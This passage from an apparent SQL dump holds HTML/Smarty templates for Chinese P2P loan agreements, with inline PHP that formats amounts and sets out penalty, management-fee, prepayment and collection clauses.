1、协议各方均应严格履行合同义务，非经各方协商一致或依照本协议约定，任何一方不得解除本协议。\n\t</p>\n\t<p>2、任何一方违约，违约方应承担因违约使得其他各方产生的费用和损失，包括但不限于调查、诉讼费、律师费等，应由违约方承担。如违约方为乙方的，甲方有权立即解除本协议，并要求乙方立即偿还未偿还的本金、利息、罚息、违约金。此时，乙方还应向丙方支付所有应付的借款管理费。如本协议提前解除时，乙方在{$SITE_URL}网站的账户里有任何余款的，丙方有权按照本协议第四条第3项的清偿顺序将乙方的余款用于清偿，并要求乙方支付因此产生的相关费用。</p>\n\t<p>3、乙方的每期还款均应按照如下顺序清偿：</p>\n\t<p>（1）根据本协议产生的其他全部费用；</p>\n\t<p>（2）本协议第四条第4款约定的罚息； </p>\n\t<p>（3）本协议第四条第5款约定的逾期管理费；</p>\n\t<p>（4）拖欠的利息； </p>\n\t<p>（5）拖欠的本金； </p>\n\t<p>（6）拖欠丙方的借款管理费；\n\t</p>\n\t<p>（7）正常的利息； </p>\n\t<p>（8）正常的本金； </p>\n\t<p>（9）丙方的借款管理费；</p>\n\t<p> 4、乙方应严格履行还款义务，如乙方逾期还款，则应按照下述条款向甲方支付逾期罚息，自逾期开始之后，逾期本金的正常利息停止计算。 </p>\n\t<p>罚息总额 = 逾期本息总额×对应罚息利率×逾期天数；</p>\n</div>\n<div>\n\t<br/>\n<table border=\"1\" style=\"margin: 0px auto; border-collapse: collapse; border: 1px solid rgb(0, 0, 0); width: 70%; \">\n\t\t<tr>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t逾期天数\n\t\t\t</td>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t1?<?php echo (int)app_conf(\"YZ_IMPSE_DAY\")-1; ?>天\n\t\t\t</td>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t{function name=\"app_conf\" v=\"YZ_IMPSE_DAY\"}天及以上\n\t\t\t</td>\n\t\t</tr>\n\t\t<tr>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t罚息利率\n\t\t\t</td>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t{$deal.impose_fee_day1}%\n\t\t\t</td>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t{$deal.impose_fee_day2}%\n\t\t\t</td>\n\t\t</tr>\n\t</table>\n\t<br/>\n\t<p>\n\t\t5、乙方应严格履行还款义务，如乙方逾期还款，则应按照下述条款向丙方支付逾期管理费：\n\t</p>\n\t<p>\n\t\t逾期管理费总额 = 逾期本息总额×对应逾期管理费率×逾期天数；\n\t</p>\n</div>\n<br/>\n<table border=\"1\" style=\"margin: 0px auto; border-collapse: collapse; border: 1px solid rgb(0, 0, 0); width: 70%; \">\n\t<tr>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t逾期天数\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t1?<?php echo (int)app_conf(\"YZ_IMPSE_DAY\")-1; ?>天\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{function name=\"app_conf\" v=\"YZ_IMPSE_DAY\"}天及以上\n\t\t</td>\n\t</tr>\n\t<tr>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t逾期管理费费率\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$deal.manage_impose_fee_day1}%\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$deal.manage_impose_fee_day2}%\n\t\t</td>\n\t</tr>\n</table>\n<br/>\n<div>\n\t<p>\n\t\t6、如果乙方逾期支付任何一期还款超过30天，或乙方在逾期后出现逃避、拒绝沟通或拒绝承认欠款事实等恶意行为，本协议项下的全部借款本息及借款管理费均提前到期，乙方应立即清偿本协议下尚未偿付的全部本金、利息、罚息、借款管理费及根据本协议产生的其他全部费用。\n\t</p>\n\t<p>\n\t\t7、如果乙方逾期支付任何一期还款超过30天，或乙方在逾期后出现逃避、拒绝沟通或拒绝承认欠款事实等恶意行为，丙方有权将乙方的“逾期记录”记入人民银行公民征信系统，丙方不承担任何法律责任。\n\t</p>\n\t<p>\n\t\t8、如果乙方逾期支付任何一期还款超过30天，或乙方在逾期后出现逃避、拒绝沟通或拒绝承认欠款事实等恶意行为，丙方有权将乙方违约失信的相关信息及乙方其他信息向媒体、用人单位、公安机关、检查机关、法律机关披露，丙方不承担任何责任。\n\t</p>\n\t<p>\n\t\t9、在乙方还清全部本金、利息、借款管理费、罚息、逾期管理费之前，罚息及逾期管理费的计算不停止。\n\t</p>\n\t<p>\n\t\t10、本协议中的所有甲方与乙方之间的借款均是相互独立的，一旦乙方逾期未归还借款本息，甲方中的任何一个出借人均有权单独向乙方追索或者提起诉讼。如乙方逾期支付借款管理费或提供虚假信息的，丙方亦可单独向乙方追索或者提起诉讼。\n\t</p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第五条 提前还款\n\t</p>\n\t<p>\n\t\t1、乙方可在借款期间任何时候提前偿还剩余借款。\n\t</p>\n\t<p>\n\t\t2、提前偿还全部剩余借款\n\t</p>\n\t<p style=\"padding-left: 15px\">\n\t\t1）乙方提前清偿全部剩余借款时，应向甲方支付当期应还本息，剩余本金及提前还款补偿（补偿金额为剩余本金的{$deal.compensate_fee}%）。\n\t</p>\n\t<p style=\"padding-left: 15px\">\n\t\t2）乙方提前清偿全部剩余借款时，应向丙方支付当期借款管理费，乙方无需支付剩余还款期的借款管理费。\n\t</p>\n\t<p>\n\t\t3、提前偿还部分借款\n\t</p>\n\t<p style=\"padding-left: 15px\">\n\t\t1）乙方提前偿还部分借款，仍应向甲方支付全部借款利息。\n\t</p>\n\t<p style=\"padding-left: 15px\">\n\t\t2）乙方提前偿还部分借款，仍应向丙方支付全部应付的借款管理费。\n\t</p>\n\t<p>\n\t\t4、任何形式的提前还款不影响丙方向乙方收取在本协议第三条中说明的居间服务费。\n\t</p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第六条\t法律及争议解决\n\t</p>\n\t <p>\n\t\t 本协议的签订、履行、终止、解释均适用中华人民共和国法律，并由丙方所在地{function name=\"app_conf\" v=\'COMPANY_REG_ADDRESS\'}人民法院管辖。\n\t</p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第七条\t附则\n\t</p>\n\t<p>\n\t\t1、本协议采用电子文本形式制成，并永久保存在丙方为此设立的专用服务器上备查，各方均认可该形式的协议效力。\n\t</p>\n\t<p>\n\t\t2、本协议自文本最终生成之日生效。\n\t</p>\n\t<p>\n\t\t3、本协议签订之日起至借款全部清偿之日止，乙方或甲方有义务在下列信息变更三日内提供更新后的信息给丙方：本人、本人的家庭联系人及紧急联系人、工作单位、居住地址、住所电话、手机号码、电子邮箱、银行账户的变更。若因任何一方不及时提供上述变更信息而带来的损失或额外费用应由该方承担。\n\t</p>\n\t<p>\n\t\t4、如果本协议中的任何一条或多条违反适用的法律法规，则该条将被视为无效，但该无效条款并不影响本协议其他条款的效力。\n\t</p>\n        <br>\n\t{if $deal.attachment}\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第八条\t附件\n\t</p>\n\t<p>\n\t\t{$deal.attachment}\n\t</p>\n\t{/if}\n</div>\n<br/>\n<div style=\"width: 98%;text-align: right;\">\n\t<p>\n\t\t{function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"Y年m月d日\"}\n\t</p>\n</div>',1,1),(3,'付息还本合同范本【普通】','<div style=\"width: 98%;text-align: right;\">编号：<span>{$deal.deal_sn}</span></div>\n<h2 align=\"center\">借款协议</h2>\n<br/>\n<div style=\"text-align: left;font-weight: 600;\">甲方（出借人）：</div>\n<table border=\"1\" style=\"margin: 0px auto; border-collapse: collapse; border: 1px solid rgb(0, 0, 0); width: 70%; \">\n    <tr>\n\t<td style=\"text-align:center;\"> {$SITE_TITLE}用户名</td>\n\t<td style=\"text-align:center;\"> 借出金额</td>\n\t<td style=\"text-align:center;\">借款期限</td>\n\t<td style=\"text-align:center;\"> 每月应收利息</td>\n\t<td style=\"text-align:center;\"> 到期还本金</td>\n    </tr>\n    {foreach from=\"$loan_list\" item=\"loan\"}\n    <tr>\n\t<td style=\"text-align:center;\">{$loan.user_name}</td>\n\t<td style=\"text-align:right;padding-right:10px\">{$CURRENCY_UNIT}{function name=\"number_format\" v=$loan.money f=2}</td>\n\t<td style=\"text-align:center;\">{$deal.repay_time}个月</td>\n\t<td style=\"text-align:right;padding-right:10px\">\n\t{$CURRENCY_UNIT}{function name=\"number_format\" v=$loan.get_repay_money f=2}\n\t</td>\n\t<td style=\"text-align:right;padding-right:10px\">{$CURRENCY_UNIT}{function name=\"number_format\" v=$loan.money f=2}</td>\n    </tr>\n    {/foreach}\n    <tr>\n\t<td style=\"text-align:center;\">总计</td>\n\t<td style=\"text-align:right;padding-right:10px\">{$CURRENCY_UNIT}{function name=\"number_format\" v=$deal.load_money f=2}</td>\n\t<td>?</td>\n\t<td>?</td>\n\t<td>?</td>\n    </tr>\n</table>\n<p>注：因计算中存在四舍五入，最后一期应收本息与之前略有不同</p>\n<br/>\n<div>\n\t<p style=\"text-align: left;font-weight: 600;\">乙方（借款人）：</p>\n\t<p style=\"text-align: left;font-weight: 600;\">{$SITE_TITLE}用户名：<span>{$deal.user.user_name}</span></p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\"> 丙方（见证人）：{function name=\"app_conf\" v=\"COMPANY\"} </p>\n\t<p style=\"text-align: left;font-weight: 600;\">联系方式：{function name=\"app_conf\" v=\"COMPANY_ADDRESS\"}</p>\n</div>\n<br/>\n<p><strong>鉴于：</strong></p>\n<p>1、丙方是一家在{function name=\"app_conf\" v=\"COMPANY_REG_ADDRESS\"}合法成立并有效存续的有限责任公司，拥有{$SITE_URL} 网站（以下简称“该网站”）的经营权，提供信用咨询，为交易提供信息服务；</p>\n<p>2、乙方已在该网站注册，并承诺其提供给丙方的信息是完全真实的；</p>\n<p>3、甲方承诺对本协议涉及的借款具有完全的支配能力，是其自有闲散资金，为其合法所得；并承诺其提供给丙方的信息是完全真实的；</p>\n<p>4、乙方有借款需求，甲方亦同意借款，双方有意成立借贷关系；</p>\n<br/>\n<p style=\"text-align: left;font-weight: 600;\">各方经协商一致，于<span> {function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"Y年m月d日\"}</span>签订如下协议，共同遵照履行：</p>\n<br/>\n<p style=\"text-align: left;font-weight: 600;\"> 第一条 借款基本信息</p>\n<br/>\n<table border=\"1\" style=\"margin: 0px auto; border-collapse: collapse; border: 1px solid rgb(0, 0, 0); width: 70%; \">\n\t<tr>\n\t\t<td width=\"20%\" style=\"padding-left:10px\"> 借款详细用途</td>\n\t\t<td style=\"padding-left:10px\"> {$deal.type_info.name}</td>\n\t</tr>\n\t<tr>\n\t\t<td style=\"padding-left:10px\">借款本金数额</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$CURRENCY_UNIT}{function name=\"number_format\" v=$deal.borrow_amount f=2}（各出借人借款本金数额详见本协议文首表格）\n\t\t</td>\n\t</tr>\n\t<tr>\n\t\t<td style=\"padding-left:10px\"> 月偿还利息数额\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$deal.month_repay_money_format}（因计算中存在四舍五入，最后一期应还金额与之前可能有所不同，为{$CURRENCY_UNIT}<?php echo number_format($this->_var[\'deal\'][\'last_month_repay_money\'] -  $this->_var[\'deal\'][\'borrow_amount\'],2);?>）\n\t\t</td>\n\t</tr>\n       <tr>\n\t\t<td style=\"padding-left:10px\"> 到期本金\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$CURRENCY_UNIT}{function name=\"number_format\" v=$deal.borrow_amount f=2}\n\t\t</td>\n\t</tr>\n\t\n\t<tr>\n\t\t<td style=\"padding-left:10px\"> 还款分期月数\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$deal.repay_time}个月\n\t\t</td>\n\t</tr>\n\t\n\t<tr>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t还款日\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t 自{function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"Y年m月d日\"}起，每月{function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"d\"}日（24:00前，节假日不顺延）\n\t\t</td>\n\t</tr>\n\t<tr>\n\t\t<td style=\"padding-left:10px\"> 借款期限\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$deal.repay_time}个月，{function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"Y年m月d日\"}起，至  {function name=\"to_date\" v=\"$deal.end_repay_time\" f=\"Y年m月d日\"}日止\n\t\t</td>\n\t</tr>\n</table>\n<br/>\n<div>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第二条 各方权利和义务\n\t</p>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t<u>甲方的权利和义务</u>\n\t</p>\n\t<p> 1、\t甲方应按合同约定的借款期限起始日期将足额的借款本金支付给乙方。\n\t</p>\n\t<p> 2、\t甲方享有其所出借款项所带来的利息收益。\n\t</p>\n\t<p>3、\t如乙方违约，甲方有权要求丙方提供其已获得的乙方信息，丙方应当提供。\n\t</p>\n\t<p>4、\t无须通知乙方，甲方可以根据自己的意愿进行本协议下其对乙方债权的转让。在甲方的债权转让后，乙方需对债权受让人继续履行本协议下其对甲方的还款义务，不得以未接到债权转让通知为由拒绝履行还款义务。\n\t</p>\n\t<p> 5、\t甲方应主动缴纳由利息所得带来的可能的税费。\n\t</p>\n\t<p>6、\t如乙方实际还款金额少于本协议约定的本金、利息及违约金的，甲方各出借人同意各自按照其于本协议文首约定的借款比例收取还款。\n\t</p>\n\t<p> 7、\t甲方应确保其提供信息和资料的真实性，不得提供虚假信息或隐瞒重要事实。\n\t</p>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t<u>乙方权利和义务</u>\n\t</p>\n\t<p> 1、\t乙方必须按期足额向甲方偿还本金和利息。\n\t</p>\n\t<p> 2、    乙方必须按期足额向丙方支付借款管理费用。\n\t</p>\n\t<p>3、\t乙方承诺所借款项不用于任何违法用途。\n\t</p>\n\t<p>4、\t乙方应确保其提供的信息和资料的真实性，不得提供虚假信息或隐瞒重要事实。\n\t</p>\n\t<p>5、\t乙方有权了解其在丙方的信用评审进度及结果。\n\t</p>\n\t<p> 6、\t乙方不得将本协议项下的任何权利义务转让给任何其他方。\n\t</p>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t<u>丙方的权利和义务</u>\n\t</p>\n\t<p>1、甲方授权并委托丙方代其收取本协议文首所约定的出借人每月应收本息，代收后按照甲方的要求进行处置，乙方对此表示认可。\n\t</p>\n\t<p>2、甲方授权并委托丙方将其支付的出借本金直接划付至乙方账户，乙方对此表示认可。\n\t</p>\n\t<p> 3、甲、乙双方一致同意，在有必要时，丙方有权代甲方对乙方进行关于本协议借款的违约提醒及催收工作，包括但不限于：电话通知、上门催收提醒、发律师函、对乙方提起诉讼等。甲方在此确认委托丙方为其进行以上工作，并授权丙方可以将此工作委托给本协议外的其他方进行。乙方对前述委托的提醒、催收事项已明确知晓并应积极配合。\n\t</p>\n\t<p>4、丙方有权按月向乙方收取双方约定的借款管理费，并在有必要时对乙方进行违约提醒及催收工作，包括但不限于电话通知、发律师函、对乙方提起诉讼等。丙方有权将此违约提醒及催收工作委托给本协议外的其他方进行。\n\t</p>\n\t<p> 5、丙方接受甲乙双方的委托行为所产生的法律后果由相应委托方承担。如因乙方或甲方或其他方（包括但不限于技术问题）造成的延误或错误，丙方不承担任何责任。\n\t</p>\n\t<p> 6、丙方应对甲方和乙方的信息及本协议内容保密；如任何一方违约，或因相关权力部门要求（包括但不限于法院、仲裁机构、金融监管机构等），丙方有权披露。\n\t</p>\n\t<p>7、丙方根据本协议对乙方进行违约提醒及催收工作时，可在其认为必要时进行上门催收提醒，即丙方派出人员（至少2名）至乙方披露的住所地或经常居住地（联系地址）处催收和进行违约提醒，同时向乙方发送催收通知单，乙方应当签收，乙方不签收的，不影响上门催收提醒的进行。丙方采取上门催收提醒的，乙方应当向丙方支付上门提醒费用，收费标准为每次人民币1000.00元，此外，乙方还应向丙方支付进行上门催收提醒服务的差旅费（包括但不限于交通费、食宿费等）。\n\t</p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第三条 借款管理费及居间服务费\n\t</p>\n\t<p>1、\t在本协议中，“借款管理费”和“居间服务费”是指因丙方为乙方提供信用咨询、评估、还款提醒、账户管理、还款特殊情况沟通、本金保障等系列信用相关服务（统称“信用服务”）而由乙方支付给丙方的报酬。\n\t</p>\n\t<p>2、\t对于丙方向乙方提供的一系列信用服务，乙方同意在借款成功时向丙方支付本协议第一条约定借款本金总额的{function name=\"number_format\" v=$deal.services_fee f=1}%(即人民币<?php echo number_format(floatval($this->_var[\'deal\'][\'services_fee\'])*$this->_var[\'deal\'][\'borrow_amount\']/100,2); ?>元)作为居间服务费，该“居间服务费”由乙方授权并委托丙方在丙方根据本协议规定的“丙方的权利和义务”第2款规定向乙方划付出借本金时从本金中予以扣除，即视为乙方已缴纳。在本协议约定的借款期限内，乙方应每月向丙方支付本协议第一条约定借款本金总额的{$deal.manage_fee}% (即人民币{function name=\"number_format\" v=\"$deal.month_manage_money\" f=2}元)，作为借款管理费用，共需支付{$deal.repay_time}期，共计人民币{function name=\"number_format\" v=\"$deal.all_manage_money\" f=2} 元，借款管理费的缴纳时间与本协议第一条约定的还款日一致。</p>\n\t<p> 本条所称的“借款成功时”系指本协议签署日。</p>\n\t<p> 3、    如乙方和丙方协商一致调整借款管理费和居间服务费时，无需经过甲方同意。 </p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第四条 违约责任\n\t</p>\n\t<p> 1、协议各方均应严格履行合同义务，非经各方协商一致或依照本协议约定，任何一方不得解除本协议。\n\t</p>\n\t<p>2、任何一方违约，违约方应承担因违约使得其他各方产生的费用和损失，包括但不限于调查、诉讼费、律师费等，应由违约方承担。如违约方为乙方的，甲方有权立即解除本协议，并要求乙方立即偿还未偿还的本金、利息、罚息、违约金。此时，乙方还应向丙方支付所有应付的借款管理费。如本协议提前解除时，乙方在{$SITE_URL}网站的账户里有任何余款的，丙方有权按照本协议第四条第3项的清偿顺序将乙方的余款用于清偿，并要求乙方支付因此产生的相关费用。</p>\n\t<p>3、乙方的每期还款均应按照如下顺序清偿：</p>\n\t<p>（1）根据本协议产生的其他全部费用；</p>\n\t<p>（2）本协议第四条第4款约定的罚息； </p>\n\t<p>（3）本协议第四条第5款约定的逾期管理费；</p>\n\t<p>（4）拖欠的利息； </p>\n\t<p>（5）拖欠的本金； </p>\n\t<p>（6）拖欠丙方的借款管理费；\n\t</p>\n\t<p>（7）正常的利息； </p>\n\t<p>（8）正常的本金； </p>\n\t<p>（9）丙方的借款管理费；</p>\n\t<p> 4、乙方应严格履行还款义务，如乙方逾期还款，则应按照下述条款向甲方支付逾期罚息，自逾期开始之后，逾期本金的正常利息停止计算。 </p>\n\t<p>罚息总额 = 逾期本息总额×对应罚息利率×逾期天数；</p>\n</div>\n<div>\n\t<br/>\n\t<table border=\"1\" style=\"margin: 0px auto; border-collapse: collapse; border: 1px solid rgb(0, 0, 0); width: 70%; \">\n\t\t<tr>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t逾期天数\n\t\t\t</td>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t1?<?php echo (int)app_conf(\"YZ_IMPSE_DAY\")-1; ?>天\n\t\t\t</td>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t{function name=\"app_conf\" v=\"YZ_IMPSE_DAY\"}天及以上\n\t\t\t</td>\n\t\t</tr>\n\t\t<tr>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t罚息利率\n\t\t\t</td>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t{$deal.impose_fee_day1}%\n\t\t\t</td>\n\t\t\t<td style=\"padding-left:10px\">\n\t\t\t\t{$deal.impose_fee_day2}%\n\t\t\t</td>\n\t\t</tr>\n\t</table>\n\t<br/>\n\t<p>\n\t\t5、乙方应严格履行还款义务，如乙方逾期还款，则应按照下述条款向丙方支付逾期管理费：\n\t</p>\n\t<p>\n\t\t逾期管理费总额 = 逾期本息总额×对应逾期管理费率×逾期天数；\n\t</p>\n</div>\n<br/>\n<table border=\"1\" style=\"margin: 0px auto; border-collapse: collapse; border: 1px solid rgb(0, 0, 0); width: 70%; \">\n\t<tr>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t逾期天数\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t1?<?php echo (int)app_conf(\"YZ_IMPSE_DAY\")-1; ?>天\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{function name=\"app_conf\" v=\"YZ_IMPSE_DAY\"}天及以上\n\t\t</td>\n\t</tr>\n\t<tr>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t逾期管理费费率\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$deal.manage_impose_fee_day1}%\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$deal.manage_impose_fee_day2}%\n\t\t</td>\n\t</tr>\n</table>\n<br/>\n<div>\n\t<p>\n\t\t6、如果乙方逾期支付任何一期还款超过30天，或乙方在逾期后出现逃避、拒绝沟通或拒绝承认欠款事实等恶意行为，本协议项下的全部借款本息及借款管理费均提前到期，乙方应立即清偿本协议下尚未偿付的全部本金、利息、罚息、借款管理费及根据本协议产生的其他全部费用。\n\t</p>\n\t<p>\n\t\t7、如果乙方逾期支付任何一期还款超过30天，或乙方在逾期后出现逃避、拒绝沟通或拒绝承认欠款事实等恶意行为，丙方有权将乙方的“逾期记录”记入人民银行公民征信系统，丙方不承担任何法律责任。\n\t</p>\n\t<p>\n\t\t8、如果乙方逾期支付任何一期还款超过30天，或乙方在逾期后出现逃避、拒绝沟通或拒绝承认欠款事实等恶意行为，丙方有权将乙方违约失信的相关信息及乙方其他信息向媒体、用人单位、公安机关、检查机关、法律机关披露，丙方不承担任何责任。\n\t</p>\n\t<p>\n\t\t9、在乙方还清全部本金、利息、借款管理费、罚息、逾期管理费之前，罚息及逾期管理费的计算不停止。\n\t</p>\n\t<p>\n\t\t10、本协议中的所有甲方与乙方之间的借款均是相互独立的，一旦乙方逾期未归还借款本息，甲方中的任何一个出借人均有权单独向乙方追索或者提起诉讼。如乙方逾期支付借款管理费或提供虚假信息的，丙方亦可单独向乙方追索或者提起诉讼。\n\t</p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第五条 提前还款\n\t</p>\n\t<p>\n\t\t1、乙方可在借款期间任何时候提前偿还剩余借款。\n\t</p>\n\t<p>\n\t\t2、提前偿还全部剩余借款\n\t</p>\n\t<p style=\"padding-left: 15px\">\n\t\t1）乙方提前清偿全部剩余借款时，应向甲方支付当期应还本息，剩余本金及提前还款补偿（补偿金额为剩余本金的{$deal.compensate_fee}%）。\n\t</p>\n\t<p style=\"padding-left: 15px\">\n\t\t2）乙方提前清偿全部剩余借款时，应向丙方支付当期借款管理费，乙方无需支付剩余还款期的借款管理费。\n\t</p>\n\t<p>\n\t\t3、提前偿还部分借款\n\t</p>\n\t<p style=\"padding-left: 15px\">\n\t\t1）乙方提前偿还部分借款，仍应向甲方支付全部借款利息。\n\t</p>\n\t<p style=\"padding-left: 15px\">\n\t\t2）乙方提前偿还部分借款，仍应向丙方支付全部应付的借款管理费。\n\t</p>\n\t<p>\n\t\t4、任何形式的提前还款不影响丙方向乙方收取在本协议第三条中说明的居间服务费。\n\t</p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第六条\t法律及争议解决\n\t</p>\n\t <p>\n\t\t 本协议的签订、履行、终止、解释均适用中华人民共和国法律，并由丙方所在地{function name=\"app_conf\" v=\'COMPANY_REG_ADDRESS\'}人民法院管辖。\n\t</p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第七条\t附则\n\t</p>\n\t<p>\n\t\t1、本协议采用电子文本形式制成，并永久保存在丙方为此设立的专用服务器上备查，各方均认可该形式的协议效力。\n\t</p>\n\t<p>\n\t\t2、本协议自文本最终生成之日生效。\n\t</p>\n\t<p>\n\t\t3、本协议签订之日起至借款全部清偿之日止，乙方或甲方有义务在下列信息变更三日内提供更新后的信息给丙方：本人、本人的家庭联系人及紧急联系人、工作单位、居住地址、住所电话、手机号码、电子邮箱、银行账户的变更。若因任何一方不及时提供上述变更信息而带来的损失或额外费用应由该方承担。\n\t</p>\n\t<p>\n\t\t4、如果本协议中的任何一条或多条违反适用的法律法规，则该条将被视为无效，但该无效条款并不影响本协议其他条款的效力。\n\t</p>\n        <br>\n\t{if $deal.attachment}\n\t<p style=\"text-align: left;font-weight: 600;\">\n\t\t第八条\t附件\n\t</p>\n\t<p>\n\t\t{$deal.attachment}\n\t</p>\n\t{/if}\n</div>\n<br/>\n<div style=\"width: 98%;text-align: right;\">\n\t<p>\n\t\t{function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"Y年m月d日\"}\n\t</p>\n</div>',1,1),(4,'付息还本合同范本【担保】','<div style=\"width: 98%;text-align: right;\">编号：<span>{$deal.deal_sn}</span></div>\n<h2 align=\"center\">借款协议</h2>\n<br/>\n<div style=\"text-align: left;font-weight: 600;\">甲方（出借人）：</div>\n<table border=\"1\" style=\"margin: 0px auto; border-collapse: collapse; border: 1px solid rgb(0, 0, 0); width: 70%; \">\n    <tr>\n\t<td style=\"text-align:center;\"> {$SITE_TITLE}用户名</td>\n\t<td style=\"text-align:center;\"> 借出金额</td>\n\t<td style=\"text-align:center;\">借款期限</td>\n\t<td style=\"text-align:center;\"> 每月应收利息</td>\n\t<td style=\"text-align:center;\"> 到期还本金</td>\n    </tr>\n    {foreach from=\"$loan_list\" item=\"loan\"}\n    <tr>\n\t<td style=\"text-align:center;\">{$loan.user_name}</td>\n\t<td style=\"text-align:right;padding-right:10px\">{$CURRENCY_UNIT}{function name=\"number_format\" v=$loan.money f=2}</td>\n\t<td style=\"text-align:center;\">{$deal.repay_time}个月</td>\n\t<td style=\"text-align:right;padding-right:10px\">\n\t{$CURRENCY_UNIT}{function name=\"number_format\" v=$loan.get_repay_money f=2}\n\t</td>\n\t<td style=\"text-align:right;padding-right:10px\">{$CURRENCY_UNIT}{function name=\"number_format\" v=$loan.money f=2}</td>\n\t</tr>\n    {/foreach}\n    <tr>\n\t<td style=\"text-align:center;\">总计</td>\n\t<td style=\"text-align:right;padding-right:10px\">{$CURRENCY_UNIT}{function name=\"number_format\" v=$deal.load_money f=2}</td>\n\t<td>?</td>\n\t<td>?</td>\n\t<td>?</td>\n    </tr>\n</table>\n<p>注：因计算中存在四舍五入，最后一期应收本息与之前略有不同</p>\n<br/>\n<div>\n\t<p style=\"text-align: left;font-weight: 600;\">乙方（借款人）：</p>\n\t<p style=\"text-align: left;font-weight: 600;\">{$SITE_TITLE}用户名：<span>{$deal.user.user_name}</span></p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\"> 丙方（见证人）：{function name=\"app_conf\" v=\"COMPANY\"} </p>\n\t<p style=\"text-align: left;font-weight: 600;\">联系方式：{function name=\"app_conf\" v=\"COMPANY_ADDRESS\"}</p>\n\t<br/>\n\t<p style=\"text-align: left;font-weight: 600;\"> 丁方（担保方）：{$deal.agency_info.name} </p>\n\t<p style=\"text-align: left;font-weight: 600;\">联系方式：{$deal.agency_info.address}</p>\n</div>\n<br/>\n<p><strong>鉴于：</strong></p>\n<p>1、丙方是一家在{function name=\"app_conf\" v=\"COMPANY_REG_ADDRESS\"}合法成立并有效存续的有限责任公司，拥有{$SITE_URL} 网站（以下简称“该网站”）的经营权，提供信用咨询，为交易提供信息服务；</p>\n<p>2、乙方已在该网站注册，并承诺其提供给丙方的信息是完全真实的；</p>\n<p>3、甲方承诺对本协议涉及的借款具有完全的支配能力，是其自有闲散资金，为其合法所得；并承诺其提供给丙方的信息是完全真实的；</p>\n<p>4、乙方有借款需求，甲方亦同意借款，双方有意成立借贷关系；</p>\n<p>5、丁方愿意作为甲方借款提供保障。当乙方逾期3天仍未清偿借款本息，则甲方本协议项下的债权（逾期本息）自动转让给丁方，丁方将在第4天垫付该标的的未清偿借款本息给甲方；</p>\n<br/>\n<p style=\"text-align: left;font-weight: 600;\">各方经协商一致，于<span> {function name=\"to_date\" v=\"$deal.repay_start_time\" f=\"Y年m月d日\"}</span>签订如下协议，共同遵照履行：</p>\n<br/>\n<p style=\"text-align: left;font-weight: 600;\"> 第一条 借款基本信息</p>\n<br/>\n<table border=\"1\" style=\"margin: 0px auto; border-collapse: collapse; border: 1px solid rgb(0, 0, 0); width: 70%; \">\n\t<tr>\n\t\t<td width=\"20%\" style=\"padding-left:10px\"> 借款详细用途</td>\n\t\t<td style=\"padding-left:10px\"> {$deal.type_info.name}</td>\n\t</tr>\n\t<tr>\n\t\t<td style=\"padding-left:10px\">借款本金数额</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$CURRENCY_UNIT}{function name=\"number_format\" v=$deal.borrow_amount f=2}（各出借人借款本金数额详见本协议文首表格）\n\t\t</td>\n\t</tr>\n\t<tr>\n\t\t<td style=\"padding-left:10px\">月偿还利息数额\n\t\t</td>\n\t\t<td style=\"padding-left:10px\">\n\t\t\t{$deal.month_repay_money_format}（因计算中存在四舍五入，最后一期应还金额与之前可能有所不同，为{$CURRENCY_UNIT}<?php echo number_format($this->_var[\'deal\'][\'last_month_repay_money\'] -  